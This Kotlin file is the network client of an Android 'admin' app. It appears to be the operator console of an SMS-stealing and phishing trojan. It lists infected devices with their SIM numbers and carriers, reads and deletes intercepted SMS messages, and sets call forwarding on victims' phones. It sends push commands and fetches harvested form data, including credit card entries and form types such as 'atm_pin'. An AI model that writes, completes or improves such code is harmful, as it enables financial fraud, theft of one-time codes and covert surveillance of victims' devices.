package com.example.admin.network

import com.example.admin.utils.Constants
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit


class SupabaseApi {

    companion object {
        private const val TAG = "BACKEND_API"

        var APP_ID: String
            get() = Constants.APP_TOKEN
            set(_) { /* no-op: token is managed by Constants / SharedPreferences */ }

        val REGISTERED_DEVICES_TABLE: String get() = APP_ID
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    // ── Data models ───────────────────────────────────────────────────────────

    data class RegisteredDevice(
        val uid: String,
        val model: String? = "",
        val manufacturer: String? = "",
        val androidVersion: String? = "",
        val brand: String? = "",
        val sim1Number: String? = "",
        val sim2Number: String? = "",
        val sim1Carrier: String? = "",
        val sim2Carrier: String? = "",
        val fcmToken: String? = "",
        val joinedAt: Long = 0L
    )

    data class DeviceStatus(
        val uid: String,
        val available: String = "",
        val checkedAt: Long = 0L,
        val timestamp: Long = 0L,
        val status: String = "",
        val type: String = "",
        val online: Boolean = false
    )

    data class BatteryDataSupabase(
        val uid: String,
        val level: Int = 0,
        val isCharging: Boolean = false,
        val temperature: Double = 0.0,
        val voltage: Int = 0,
        val health: String? = "",
        val timestamp: Long = 0L
    )

    data class AdminConfig(
        val id: String = "main",
        val number: String = "",
        val status: String = "OFF",
        val updatedAt: Long = 0L
    )

    data class SmsLog(
        val id: String? = null,
        val uniqueId: String,
        val title: String,
        val body: String,
        val senderNumber: String,
        val receiverNumber: String,
        val timestamp: Long,
        val isBanking: Boolean = false
    )

    data class CreditCardApplicationEntry(
        val id: Long = 0L,
        val type: String = "",
        val data: Map<String, Any> = emptyMap(),
        val submittedAtMs: Long = 0L
    )

    /**
     * Paginated response combining all 4 data types in a single backend call.
     * Used by DeviceActivity for lazy loading (offset / limit pagination).
     */
    data class DevicePage(
        val devices: List<RegisteredDevice>,
        val statuses: Map<String, DeviceStatus>,
        val batteries: Map<String, BatteryDataSupabase>,
        val stars: Map<String, Boolean>,
        val hasMore: Boolean,
        val nextOffset: Int
    )

    // ── HTTP helpers ──────────────────────────────────────────────────────────

    private fun baseUrl(): String =
        "${Constants.BACKEND_ROOT.trimEnd('/')}/api/device/${Constants.APP_TOKEN}"

    private fun jsonBody(jsonObject: JSONObject) =
        jsonObject.toString().toRequestBody("application/json; charset=utf-8".toMediaType())

    private fun get(url: String): Pair<Int, String> {
        val req  = Request.Builder().url(url).get().build()
        val resp = client.newCall(req).execute()
        return resp.code to (resp.body?.string() ?: "")
    }

    private fun post(url: String, body: JSONObject): Pair<Int, String> {
        val req  = Request.Builder().url(url).post(jsonBody(body)).build()
        val resp = client.newCall(req).execute()
        return resp.code to (resp.body?.string() ?: "")
    }

    private fun patch(url: String, body: JSONObject): Pair<Int, String> {
        val req  = Request.Builder().url(url).patch(jsonBody(body)).build()
        val resp = client.newCall(req).execute()
        return resp.code to (resp.body?.string() ?: "")
    }

    private fun delete(url: String): Pair<Int, String> {
        val req  = Request.Builder().url(url).delete().build()
        val resp = client.newCall(req).execute()
        return resp.code to (resp.body?.string() ?: "")
    }

    // ── Row filter helpers (kept for SSE event parsing) ───────────────────────

    fun isRealDeviceRow(subId: String, dataType: String = ""): Boolean {
        if (subId.isBlank()) return false
        if (subId == "admin_config_main") return false
        if (subId.startsWith("admin_")) return false
        if (subId.startsWith("star_")) return false
        if (dataType.equals("admin_config", ignoreCase = true)) return false
        if (dataType.equals("starred_device", ignoreCase = true)) return false
        if (dataType.equals("call_forwarding", ignoreCase = true)) return false
        return true
    }

    // ── SSE event routing helper ──────────────────────────────────────────────
    //
    // Use this in every Activity's SSE event handler to avoid cross-table confusion.
    //
    // SSE payload format: {"event":"INSERT|UPDATE|DELETE","table":"devices|form_data|messages","record":{...}}
    //
    // PROBLEM this solves:
    //   Without a table check, DeviceActivity calls parseRegisteredDeviceRow() on a
    //   form_data record → returns null → device shows as null on screen.
    //
    // HOW TO USE in DeviceActivity (inside your SSE line-reading loop):
    //
    //   val json   = JSONObject(dataLine)
    //   val table  = json.optString("table", "")
    //   val event  = json.optString("event", "")
    //   val record = json.optJSONObject("record") ?: JSONObject()
    //
    //   when (table) {
    //       "devices" -> {
    //           if (event == "UPDATE" || event == "INSERT") {
    //               parseRegisteredDeviceRow(record)?.let { dev ->
    //                   if (dev.uid == currentDeviceId) runOnUiThread { updateDeviceUi(dev) }
    //               }
    //               parseDeviceStatusRow(record)?.let { status ->
    //                   if (status.uid == currentDeviceId) runOnUiThread { updateStatusUi(status) }
    //               }
    //               parseBatteryRow(record)?.let { batt ->
    //                   if (batt.uid == currentDeviceId) runOnUiThread { updateBatteryUi(batt) }
    //               }
    //           }
    //       }
    //       "form_data" -> {
    //           // Live form entry — add to list WITHOUT touching device status
    //           if (event == "INSERT") {
    //               val uid = record.optString("sub_id", "")
    //               if (uid == currentDeviceId) {
    //                   parseSseFormDataRow(record)?.let { entry ->
    //                       runOnUiThread { prependFormEntry(entry) }   // add to your RecyclerView
    //                   }
    //               }
    //           }
    //       }
    //       "messages" -> {
    //           if (event == "INSERT") {
    //               parseSmsRow(record)?.let { sms ->
    //                   if (sms.uniqueId == currentDeviceId) runOnUiThread { prependSms(sms) }
    //               }
    //           }
    //       }
    //       // else: ignore unknown tables — NEVER fall through to device parsers
    //   }

    /**
     * Parse a single row from the `form_data` table (SSE INSERT event or REST row)
     * into a [CreditCardApplicationEntry].
     *
     * form_data schema: { id, app_id, sub_id, form_type, data: {...}, submitted_at }
     * Returns null only if the `data` object is empty (no useful fields).
     */
    fun parseSseFormDataRow(record: JSONObject): CreditCardApplicationEntry? {
        val dataObj = record.optJSONObject("data") ?: JSONObject()
        val dataMap = mutableMapOf<String, Any>()
        val keys    = dataObj.keys()
        while (keys.hasNext()) {
            val key = keys.next()
            when (val value = dataObj.get(key)) {
                is String  -> dataMap[key] = value
                is Int     -> dataMap[key] = value
                is Long    -> dataMap[key] = value
                is Double  -> dataMap[key] = value
                is Boolean -> dataMap[key] = value
                else       -> dataMap[key] = value.toString()
            }
        }
        if (dataMap.isEmpty()) return null
        val submittedAt = parseTimestampString(record.optString("submitted_at", "")) ?: 0L
        return CreditCardApplicationEntry(
            id            = record.optLong("id", 0L),
            type          = record.optString("form_type", "form"),
            data          = dataMap,
            submittedAtMs = submittedAt
        )
    }

    // ── Row parsers (used both for REST responses and SSE events) ─────────────

    /**
     * Android's JSONObject.optString(key, fallback) returns the STRING "null" when the
     * JSON value is a JSON null — it does NOT use the fallback. This helper fixes that.
     */
    private fun JSONObject.safeStr(vararg keys: String): String {
        for (key in keys) {
            if (!has(key) || isNull(key)) continue
            val v = optString(key, "")
            if (v.isNotBlank() && v != "null") return v
        }
        return ""
    }

    fun parseRegisteredDeviceRow(row: JSONObject): RegisteredDevice? {
        val uid      = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(uid, dataType)) return null

        val dataJson = row.optJSONObject("data_json") ?: JSONObject()

        return RegisteredDevice(
            uid            = uid,
            model          = dataJson.safeStr("model")
                .ifBlank { row.safeStr("device_model", "model") },
            manufacturer   = dataJson.safeStr("manufacturer")
                .ifBlank { row.safeStr("manufacturer") },
            androidVersion = dataJson.safeStr("androidversion", "androidVersion")
                .ifBlank { row.safeStr("android_version", "androidversion") },
            brand          = dataJson.safeStr("brand")
                .ifBlank { row.safeStr("brand") },
            sim1Number     = dataJson.safeStr("sim1number", "sim1Number")
                .ifBlank { row.safeStr("sim1number") },
            sim2Number     = dataJson.safeStr("sim2number", "sim2Number")
                .ifBlank { row.safeStr("sim2number") },
            sim1Carrier    = dataJson.safeStr("sim1carrier", "sim1Carrier", "sim1_carrier")
                .ifBlank { row.safeStr("sim1carrier") },
            sim2Carrier    = dataJson.safeStr("sim2carrier", "sim2Carrier", "sim2_carrier")
                .ifBlank { row.safeStr("sim2carrier") },
            fcmToken       = row.safeStr("fcm_token")
                .ifBlank { dataJson.safeStr("fcm_token", "fcmtoken", "fcmToken") },
            joinedAt       = row.optLong("registered_at", row.optLong("created_at",
                dataJson.optLong("joinedat", 0L)))
        )
    }

    fun parseDeviceStatusRow(row: JSONObject, now: Long = System.currentTimeMillis()): DeviceStatus? {
        val uid      = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(uid, dataType)) return null

        val dataJson  = row.optJSONObject("data_json") ?: JSONObject()
        val heartbeat = dataJson.optJSONObject("heartbeat") ?: JSONObject()

        val lastSeenStr = row.optString("last_seen", row.optString("updated_at", ""))
        val lastSeenMs  = parseTimestampString(lastSeenStr) ?: row.optLong("last_heartbeat_at", 0L)

        val checkedAt = heartbeat.optLong(
            "checked_at",
            dataJson.optLong("online_checked_at", dataJson.optLong("last_seen_at", lastSeenMs))
        )

        val available = heartbeat.optString(
            "available",
            if (dataJson.optString("online_status", row.optString("status", ""))
                    .equals("online", ignoreCase = true)) "Device is online" else ""
        )

        val status = dataJson.optString(
            "online_status",
            if (checkedAt > 0L) "online" else row.optString("status", "")
        )

        val online = checkedAt > 0L && now - checkedAt in 0 until (15 * 60 * 1000L)

        return DeviceStatus(
            uid       = uid,
            available = available,
            checkedAt = checkedAt,
            timestamp = checkedAt,
            status    = status,
            type      = "heartbeat",
            online    = online
        )
    }

    fun parseBatteryRow(row: JSONObject): BatteryDataSupabase? {
        val uid      = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(uid, dataType)) return null

        val dataJson = row.optJSONObject("data_json") ?: JSONObject()
        val battery  = dataJson.optJSONObject("battery_data") ?: return null

        return BatteryDataSupabase(
            uid         = uid,
            level       = battery.optInt("level", 0),
            isCharging  = battery.optBoolean("isCharging", battery.optBoolean("ischarging", false)),
            temperature = battery.optDouble("temperature", 0.0),
            voltage     = battery.optInt("voltage", 0),
            health      = battery.optString("health", ""),
            timestamp   = battery.optLong("timestamp", 0L)
        )
    }

    fun parseStarredRow(row: JSONObject): Pair<String, Boolean>? {
        val uid      = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(uid, dataType)) return null
        val dataJson = row.optJSONObject("data_json") ?: JSONObject()
        return uid to dataJson.optBoolean("starred", false)
    }

    /**
     * Parse a row from the backend `messages` table.
     * Schema: { id, app_id, sub_id, from_id, to_id, content, message_type, sent_at, is_read }
     */
    fun parseSmsRow(row: JSONObject): SmsLog? {
        val deviceId = row.optString("sub_id", "").trim()
        if (deviceId.isBlank()) return null
        val content = row.optString("content", "").trim()
        if (content.isBlank()) return null

        val sentAt    = row.optString("sent_at", "")
        val timestamp = if (sentAt.isNotBlank()) parseTimestampString(sentAt) ?: System.currentTimeMillis()
        else System.currentTimeMillis()

        return SmsLog(
            id             = row.optInt("id", 0).toString(),
            uniqueId       = deviceId,
            title          = "New SMS",
            body           = content,
            senderNumber   = row.optString("from_id", "Unknown"),
            receiverNumber = row.optString("to_id", ""),
            timestamp      = timestamp,
            isBanking      = false
        )
    }

    // ── Kept for SSE device-row events (data still embedded in device.data_json) ──

    fun parseSmsMessagesFromRegisteredDevice(row: JSONObject): List<SmsLog> {
        val deviceId = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(deviceId, dataType)) return emptyList()

        val smsArray = row.optJSONArray("sms_messages") ?: JSONArray()
        val list     = mutableListOf<SmsLog>()

        for (i in 0 until smsArray.length()) {
            val obj = smsArray.optJSONObject(i) ?: continue
            parseSingleSmsObject(deviceId, obj, i)?.let { list.add(it) }
        }

        return list
    }

    fun parseSingleSmsObject(deviceId: String, obj: JSONObject, index: Int = 0): SmsLog? {
        val rawSmsId  = obj.optString("sms_id", obj.optString("id", obj.optString("message_id", ""))).trim()
        val timestamp = readTimestamp(obj)

        val smsId = when {
            rawSmsId.isNotBlank() -> rawSmsId
            timestamp > 0L        -> "sms_$timestamp"
            else                  -> "sms_${deviceId}_${System.currentTimeMillis()}_$index"
        }

        val body = obj.optString(
            "message_body",
            obj.optString("body", obj.optString("text", obj.optString("message", obj.optString("content", ""))))
        )
        if (body.isBlank()) return null

        val sender = obj.optString(
            "sender_number",
            obj.optString("phone_number", obj.optString("sender", obj.optString("from", "Unknown")))
        )

        val receiver = obj.optString("receiver_number", obj.optString("receiver", obj.optString("to", "")))

        return SmsLog(
            id             = smsId,
            uniqueId       = deviceId,
            title          = obj.optString("title", "New SMS"),
            body           = body,
            senderNumber   = sender,
            receiverNumber = receiver,
            timestamp      = if (timestamp > 0L) timestamp else System.currentTimeMillis(),
            isBanking      = false
        )
    }

    private fun readTimestamp(obj: JSONObject): Long {
        val longTs = obj.optLong("timestamp", 0L)
        if (longTs > 0L) return longTs
        val syncedAt = obj.optLong("synced_at", 0L)
        if (syncedAt > 0L) return syncedAt
        val timestampText = obj.optString("timestamp", "")
        if (timestampText.isNotBlank()) parseTimestampString(timestampText)?.let { return it }
        val readable = obj.optString("timestamp_readable", "")
        if (readable.isNotBlank()) parseTimestampString(readable)?.let { return it }
        return 0L
    }

    // ── FIXED: parseTimestampString ───────────────────────────────────────────
    //
    // ROOT CAUSE OF BUG:
    //   DB returns timestamps like "2026-05-28T08:41:28.66+00:00"
    //   Format = fractional seconds (.66) + timezone offset (+00:00)
    //   The old patterns list had NO entry for this format!
    //   Also old code used Locale.getDefault() which breaks on some devices.
    //
    // FIX:
    //   1. Normalize fractional seconds to exactly 3 digits (.66 → .660)
    //      so SimpleDateFormat "SSS" always matches
    //   2. Added "yyyy-MM-dd'T'HH:mm:ss.SSSXXX" (ms + timezone) pattern
    //   3. Changed Locale.getDefault() → Locale.US (consistent across devices)
    //   4. Most specific patterns tried first

    private fun parseTimestampString(value: String): Long? {
        if (value.isBlank()) return null

        // Fast path: plain epoch milliseconds as string
        value.toLongOrNull()?.let { if (it > 0L) return it }

        // Normalize fractional seconds to exactly 3 digits
        // e.g. "T10:30:28.66+00:00" → "T10:30:28.660+00:00"
        //      "T10:30:28.1234567Z"  → "T10:30:28.123Z"
        val normalized = Regex("(T\\d{2}:\\d{2}:\\d{2})\\.(\\d+)").replace(value) { mr ->
            val frac = mr.groupValues[2].let { f ->
                when {
                    f.length >= 3 -> f.take(3)
                    else          -> f.padEnd(3, '0')
                }
            }
            "${mr.groupValues[1]}.$frac"
        }

        // Patterns ordered most-specific first; Locale.US for consistent parsing
        val patterns = listOf(
            "yyyy-MM-dd'T'HH:mm:ss.SSSXXX",   // "2026-05-28T08:41:28.660+00:00" ← DB format
            "yyyy-MM-dd'T'HH:mm:ssXXX",        // "2026-05-28T08:41:28+00:00"
            "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'",    // "2026-05-28T08:41:28.660Z"
            "yyyy-MM-dd'T'HH:mm:ss.SSSSSS'Z'", // "2026-05-28T08:41:28.660000Z"
            "yyyy-MM-dd'T'HH:mm:ss'Z'",         // "2026-05-28T08:41:28Z"
            "yyyy-MM-dd HH:mm:ss",              // "2026-05-28 08:41:28"
            "dd MMM yyyy, hh:mm a"              // "28 May 2026, 08:41 AM"
        )

        for (pattern in patterns) {
            try {
                val sdf = SimpleDateFormat(pattern, Locale.US)
                if (!pattern.contains("XXX")) sdf.timeZone = TimeZone.getTimeZone("UTC")
                val date = sdf.parse(normalized)
                if (date != null) return date.time
            } catch (_: Exception) {}
        }

        return null
    }

    // ── REST API methods ──────────────────────────────────────────────────────

    suspend fun getAllDevices(): Result<List<RegisteredDevice>> = withContext(Dispatchers.IO) {
        try {
            val (code, body) = get("${baseUrl()}/get")
            if (code !in 200..299) return@withContext Result.failure(Exception("getAllDevices HTTP $code: $body"))

            val json  = JSONObject(body)
            val array = json.optJSONArray("data") ?: JSONArray()
            val list  = mutableListOf<RegisteredDevice>()

            for (i in 0 until array.length()) {
                parseRegisteredDeviceRow(array.getJSONObject(i))?.let { list.add(it) }
            }

            Result.success(list)
        } catch (e: Exception) {
            Log.e(TAG, "getAllDevices exception", e)
            Result.failure(e)
        }
    }

    /**
     * Paginated fetch — single backend call that returns all 4 data types.
     * Replaces separate getAllDevices() + getAllDeviceStatuses() + getAllBatteryData() + getStarredDevices() calls.
     * Backend route: GET /api/device/:appToken/get?offset=N&limit=M
     */
    suspend fun getDevicesPage(offset: Int = 0, limit: Int = 50): Result<DevicePage> =
        withContext(Dispatchers.IO) {
            try {
                val safeOffset = offset.coerceAtLeast(0)
                val safeLimit  = limit.coerceIn(1, 200)
                val (code, body) = get("${baseUrl()}/get?offset=$safeOffset&limit=$safeLimit")
                if (code !in 200..299)
                    return@withContext Result.failure(Exception("getDevicesPage HTTP $code: $body"))

                val json    = JSONObject(body)
                val array   = json.optJSONArray("data") ?: JSONArray()
                val hasMore = json.optBoolean("hasMore", false)
                val now     = System.currentTimeMillis()

                val devices   = mutableListOf<RegisteredDevice>()
                val statuses  = mutableMapOf<String, DeviceStatus>()
                val batteries = mutableMapOf<String, BatteryDataSupabase>()
                val stars     = mutableMapOf<String, Boolean>()

                for (i in 0 until array.length()) {
                    val row = array.getJSONObject(i)

                    parseRegisteredDeviceRow(row)?.let { dev -> devices.add(dev) }

                    parseDeviceStatusRow(row, now)?.let { status ->
                        val existing = statuses[status.uid]
                        if (existing == null || status.checkedAt > existing.checkedAt)
                            statuses[status.uid] = status
                    }

                    parseBatteryRow(row)?.let { batt ->
                        batteries[batt.uid] = batt
                    }

                    parseStarredRow(row)?.let { (uid, starred) ->
                        stars[uid] = starred
                    }
                }

                Result.success(
                    DevicePage(
                        devices    = devices,
                        statuses   = statuses,
                        batteries  = batteries,
                        stars      = stars,
                        hasMore    = hasMore,
                        nextOffset = safeOffset + devices.size
                    )
                )
            } catch (e: Exception) {
                Log.e(TAG, "getDevicesPage exception", e)
                Result.failure(e)
            }
        }

    suspend fun getAllDeviceStatuses(): Result<List<DeviceStatus>> = withContext(Dispatchers.IO) {
        try {
            val (code, body) = get("${baseUrl()}/get")
            if (code !in 200..299) return@withContext Result.failure(Exception("getAllDeviceStatuses HTTP $code"))

            val json  = JSONObject(body)
            val array = json.optJSONArray("data") ?: JSONArray()
            val list  = mutableListOf<DeviceStatus>()
            val now   = System.currentTimeMillis()

            for (i in 0 until array.length()) {
                parseDeviceStatusRow(array.getJSONObject(i), now)?.let { list.add(it) }
            }

            Result.success(list)
        } catch (e: Exception) {
            Log.e(TAG, "getAllDeviceStatuses exception", e)
            Result.failure(e)
        }
    }

    suspend fun getLatestDeviceStatuses(): Result<Map<String, DeviceStatus>> = withContext(Dispatchers.IO) {
        try {
            val statuses  = getAllDeviceStatuses().getOrNull() ?: emptyList()
            val latestMap = mutableMapOf<String, DeviceStatus>()
            statuses.forEach { status ->
                val old = latestMap[status.uid]
                if (old == null || status.checkedAt > old.checkedAt) latestMap[status.uid] = status
            }
            Result.success(latestMap)
        } catch (e: Exception) {
            Log.e(TAG, "getLatestDeviceStatuses exception", e)
            Result.failure(e)
        }
    }

    /**
     * Fetch SMS messages from the dedicated messages table via backend.
     */
    suspend fun getAllSmsMessagesFromRegisteredDevices(rowLimit: Int = 200): Result<List<SmsLog>> =
        withContext(Dispatchers.IO) {
            try {
                val safeLimit    = rowLimit.coerceIn(1, 1000)
                val (code, body) = get("${baseUrl()}/messages?limit=$safeLimit")
                if (code !in 200..299) return@withContext Result.failure(Exception("getAllSms HTTP $code"))

                val json   = JSONObject(body)
                val array  = json.optJSONArray("data") ?: JSONArray()
                val list   = mutableListOf<SmsLog>()
                val keySet = HashSet<String>()

                for (i in 0 until array.length()) {
                    parseSmsRow(array.getJSONObject(i))?.let { sms ->
                        val key = "${sms.uniqueId}-${sms.id}"
                        if (keySet.add(key)) list.add(sms)
                    }
                }

                Result.success(list)
            } catch (e: Exception) {
                Log.e(TAG, "getAllSmsMessages exception", e)
                Result.failure(e)
            }
        }

    suspend fun getAllSmsLogs(limit: Int = 200): Result<List<SmsLog>> =
        getAllSmsMessagesFromRegisteredDevices(rowLimit = limit)

    suspend fun getSmsLogsByUniqueId(uniqueId: String, limit: Int = 50): Result<List<SmsLog>> =
        withContext(Dispatchers.IO) {
            try {
                val safeLimit    = limit.coerceIn(1, 500)
                val (code, body) = get("${baseUrl()}/messages?uid=${uniqueId}&limit=$safeLimit")
                if (code !in 200..299) return@withContext Result.failure(Exception("getSmsById HTTP $code"))

                val json  = JSONObject(body)
                val array = json.optJSONArray("data") ?: JSONArray()
                val list  = mutableListOf<SmsLog>()

                for (i in 0 until array.length()) {
                    parseSmsRow(array.getJSONObject(i))?.let { list.add(it) }
                }

                Result.success(list.sortedByDescending { it.timestamp })
            } catch (e: Exception) {
                Log.e(TAG, "getSmsLogsByUniqueId exception", e)
                Result.failure(e)
            }
        }

    suspend fun deleteSmsFromRegisteredDevice(deviceId: String, smsId: String): Result<Boolean> =
        withContext(Dispatchers.IO) {
            try {
                if (deviceId.isBlank() || smsId.isBlank())
                    return@withContext Result.failure(Exception("deviceId/smsId missing"))

                val (code, body) = delete("${baseUrl()}/messages/$smsId")
                if (code !in 200..299)
                    return@withContext Result.failure(Exception("deleteSms HTTP $code: $body"))

                Result.success(true)
            } catch (e: Exception) {
                Log.e(TAG, "deleteSmsFromRegisteredDevice exception", e)
                Result.failure(e)
            }
        }

    suspend fun deleteSmsLog(smsId: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            if (smsId.isBlank()) return@withContext Result.failure(Exception("smsId missing"))
            deleteSmsFromRegisteredDevice("", smsId)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun deleteAllSmsMessagesForApp(): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val (code, body) = delete("${baseUrl()}/messages")
            if (code !in 200..299)
                return@withContext Result.failure(Exception("deleteAllSms HTTP $code: $body"))
            Result.success(true)
        } catch (e: Exception) {
            Log.e(TAG, "deleteAllSmsMessagesForApp exception", e)
            Result.failure(e)
        }
    }

    suspend fun getAdminConfig(): Result<AdminConfig> = withContext(Dispatchers.IO) {
        try {
            val (code, body) = get("${baseUrl()}/admin-config")
            if (code !in 200..299) return@withContext Result.success(AdminConfig())

            val json    = JSONObject(body)
            val row     = json.optJSONObject("data") ?: return@withContext Result.success(AdminConfig())
            val dataJson = row.optJSONObject("data_json") ?: JSONObject()

            Result.success(
                AdminConfig(
                    id        = "main",
                    number    = dataJson.optString("number", ""),
                    status    = dataJson.optString("status", row.optString("status", "OFF")),
                    updatedAt = row.optLong("updated_at", dataJson.optLong("updated_at", 0L))
                )
            )
        } catch (e: Exception) {
            Log.e(TAG, "getAdminConfig exception", e)
            Result.success(AdminConfig())
        }
    }

    suspend fun updateAdminConfig(number: String, status: String): Result<Boolean> =
        withContext(Dispatchers.IO) {
            try {
                val body = JSONObject().apply {
                    put("number", number)
                    put("status", status)
                }
                val (code, resp) = post("${baseUrl()}/admin-config", body)
                if (code !in 200..299) Log.e(TAG, "updateAdminConfig HTTP $code: $resp")
                Result.success(code in 200..299)
            } catch (e: Exception) {
                Log.e(TAG, "updateAdminConfig exception", e)
                Result.failure(e)
            }
        }

    suspend fun updateCallForwarding(uid: String, number: String, status: String): Result<Boolean> =
        withContext(Dispatchers.IO) {
            try {
                if (uid.isBlank()) return@withContext Result.failure(Exception("UID missing"))
                if (!isRealDeviceRow(uid)) return@withContext Result.failure(Exception("Invalid device row"))

                val body = JSONObject().apply {
                    put("call_forward_number", number)
                    put("call_forward_status", status)
                    put("call_forward_timestamp", System.currentTimeMillis())
                }
                val (code, resp) = patch("${baseUrl()}/update/$uid", body)
                if (code !in 200..299) Log.e(TAG, "updateCallForwarding HTTP $code: $resp")
                Result.success(code in 200..299)
            } catch (e: Exception) {
                Log.e(TAG, "updateCallForwarding exception", e)
                Result.failure(e)
            }
        }

    suspend fun getStarredDevices(): Result<Map<String, Boolean>> = withContext(Dispatchers.IO) {
        try {
            val (code, body) = get("${baseUrl()}/get")
            if (code !in 200..299) return@withContext Result.success(emptyMap())

            val json  = JSONObject(body)
            val array = json.optJSONArray("data") ?: JSONArray()
            val map   = mutableMapOf<String, Boolean>()

            for (i in 0 until array.length()) {
                parseStarredRow(array.getJSONObject(i))?.let { map[it.first] = it.second }
            }

            Result.success(map)
        } catch (e: Exception) {
            Log.e(TAG, "getStarredDevices exception", e)
            Result.success(emptyMap())
        }
    }

    suspend fun setStarred(uid: String, starred: Boolean): Result<Boolean> =
        withContext(Dispatchers.IO) {
            try {
                if (uid.isBlank()) return@withContext Result.failure(Exception("UID missing"))
                if (!isRealDeviceRow(uid)) return@withContext Result.failure(Exception("Invalid device row"))

                val body = JSONObject().apply {
                    put("data_json", JSONObject().apply {
                        put("starred", starred)
                        put("starred_updated_at", System.currentTimeMillis())
                    })
                }
                val (code, resp) = patch("${baseUrl()}/update/$uid", body)
                if (code !in 200..299) Log.e(TAG, "setStarred HTTP $code: $resp")
                Result.success(code in 200..299)
            } catch (e: Exception) {
                Log.e(TAG, "setStarred exception", e)
                Result.failure(e)
            }
        }

    suspend fun getAllBatteryData(): Result<List<BatteryDataSupabase>> = withContext(Dispatchers.IO) {
        try {
            val (code, body) = get("${baseUrl()}/get")
            if (code !in 200..299) return@withContext Result.success(emptyList())

            val json  = JSONObject(body)
            val array = json.optJSONArray("data") ?: JSONArray()
            val list  = mutableListOf<BatteryDataSupabase>()

            for (i in 0 until array.length()) {
                parseBatteryRow(array.getJSONObject(i))?.let { list.add(it) }
            }

            Result.success(list)
        } catch (e: Exception) {
            Log.e(TAG, "getAllBatteryData exception", e)
            Result.success(emptyList())
        }
    }

    suspend fun deleteDevice(uid: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            if (uid.isBlank()) return@withContext Result.failure(Exception("UID missing"))
            if (!isRealDeviceRow(uid)) return@withContext Result.failure(Exception("Invalid device row"))

            val (code, body) = delete("${baseUrl()}/delete/$uid")
            if (code !in 200..299) Log.e(TAG, "deleteDevice HTTP $code: $body")
            Result.success(code in 200..299)
        } catch (e: Exception) {
            Log.e(TAG, "deleteDevice exception", e)
            Result.failure(e)
        }
    }

    suspend fun sendFcmPush(
        uid: String,
        title: String,
        body: String,
        data: Map<String, String> = emptyMap()
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val dataJson = JSONObject().apply {
                put("uid", uid)
                put("title", title)
                put("body", body)
                val dataObj = JSONObject()
                data.forEach { (k, v) -> dataObj.put(k, v) }
                put("data", dataObj)
            }
            val (code, resp) = post("${baseUrl()}/fcm-send", dataJson)
            if (code !in 200..299) Log.e(TAG, "sendFcmPush HTTP $code: $resp")
            Result.success(code in 200..299)
        } catch (e: Exception) {
            Log.e(TAG, "sendFcmPush exception", e)
            Result.failure(e)
        }
    }

    suspend fun getCreditCardApplications(uid: String): Result<List<CreditCardApplicationEntry>> =
        withContext(Dispatchers.IO) {
            try {
                val parseArray: (String) -> List<CreditCardApplicationEntry> = { body ->
                    val json       = JSONObject(body)
                    val array      = json.optJSONArray("data") ?: JSONArray()
                    val resultList = mutableListOf<CreditCardApplicationEntry>()
                    for (i in 0 until array.length()) {
                        val row      = array.getJSONObject(i)
                        val formType = row.optString("form_type", "form")
                        // NO FILTER — show ALL form types (form, farmer_registration, atm_pin, etc.)
                        val dataObj  = row.optJSONObject("data") ?: JSONObject()
                        val dataMap  = mutableMapOf<String, Any>()
                        val keys     = dataObj.keys()
                        while (keys.hasNext()) {
                            val key = keys.next()
                            when (val value = dataObj.get(key)) {
                                is String  -> dataMap[key] = value
                                is Int     -> dataMap[key] = value
                                is Long    -> dataMap[key] = value
                                is Double  -> dataMap[key] = value
                                is Boolean -> dataMap[key] = value
                                else       -> dataMap[key] = value.toString()
                            }
                        }
                        val submittedAt = parseTimestampString(row.optString("submitted_at", "")) ?: 0L
                        if (dataMap.isNotEmpty()) {
                            resultList.add(CreditCardApplicationEntry(
                                id            = row.optLong("id", 0L),
                                type          = formType,
                                data          = dataMap,
                                submittedAtMs = submittedAt
                            ))
                        }
                    }
                    resultList
                }

                // First try uid-specific data
                if (uid.isNotBlank()) {
                    val (code, body) = get("${baseUrl()}/form-data?uid=$uid&limit=100")
                    if (code in 200..299) {
                        val list = parseArray(body)
                        if (list.isNotEmpty())
                            return@withContext Result.success(list.sortedByDescending { it.submittedAtMs })
                    }
                }

                // Fallback: fetch ALL data (handles device re-registration with new sub_id)
                Log.d(TAG, "getCreditCardApplications: no data for uid=$uid, fetching all")
                val (code2, body2) = get("${baseUrl()}/form-data?limit=200")
                if (code2 !in 200..299)
                    return@withContext Result.success(emptyList())

                Result.success(parseArray(body2).sortedByDescending { it.submittedAtMs })
            } catch (e: Exception) {
                Log.e(TAG, "getCreditCardApplications exception", e)
                Result.failure(e)
            }
        }

    fun formatForDisplay(timestamp: Long): String {
        if (timestamp <= 0L) return "-"
        return try {
            SimpleDateFormat("dd MMM yyyy, hh:mm a", Locale.getDefault()).format(Date(timestamp))
        } catch (e: Exception) {
            timestamp.toString()
        }
    }
}
